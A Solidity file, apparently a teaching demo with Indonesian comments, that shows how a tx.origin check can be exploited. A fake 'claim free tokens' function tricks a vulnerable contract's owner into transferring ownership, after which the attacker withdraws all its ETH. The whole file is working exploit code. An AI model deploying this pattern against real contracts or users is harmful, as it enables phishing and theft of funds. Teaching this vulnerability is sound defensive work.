// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./VulnerableAuth.sol";

/**
 * @title PhishingAttacker
 * @notice Contract yang EXPLOIT tx.origin buat curi ownership
 *
 * SCENARIO:
 * 1. Attacker deploy PhishingAttacker(address vulnerableContract)
 * 2. Attacker kasih link phising ke owner (misal: "Claim free tokens!")
 * 3. Owner KLIK link → MetaMask popup muncul
 * 4. Owner ACCIDENTALLY approve transaksi (thinking it's just claiming tokens)
 * 5. Transaksi jalan: owner → PhishingAttacker → VulnerableAuth.transferOwnership()
 * 6. tx.origin = owner (yang approve transaksi)
 * 7. TransferOwnership check: tx.origin == owner → PASS!
 * 8. Ownership BERHASIL diambil attacker!
 * 9. Attacker panggil withdraw() → semua ETH hilang
 *
 * Kenapa berbahaya?
 *   → Owner gak sadar dia transfer ownership
 *   → MetaMask cuma show "Approve transaction?"
 *   → Gak ada indikasi ini adalah phishing
 *   → Tx.origin SELALU = EOA yang mulai transaksi
 */
contract PhishingAttacker {
    VulnerableAuth public vulnerableContract;
    address public attacker;
    address public stolenOwner;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableAuth(payable(_vulnerableContract));
        attacker = msg.sender;
    }

    // Step 1: Owner ACCIDENTALLY panggil fungsi ini
    // (misal karena tertarik sama "free tokens" phising)
    function claimFreeTokens() external {
        // Di sini attacker "pura-pura" kasih free tokens
        // Tapi sebenarnya...

        // Step 2: Panggil transferOwnership ke attacker
        // tx.origin = owner (karena owner yang mulai transaksi ini!)
        vulnerableContract.transferOwnership(attacker);

        // Step 3: Sekarang attacker jadi owner!
        stolenOwner = vulnerableContract.owner();
    }

    // Step 4: Setelah jadi owner, withdraw semua ETH
    function stealAllETH() external {
        require(msg.sender == attacker, "Not attacker!");
        vulnerableContract.withdraw();

        // Kirim ke attacker
        (bool success,) = attacker.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    receive() external payable {}
}
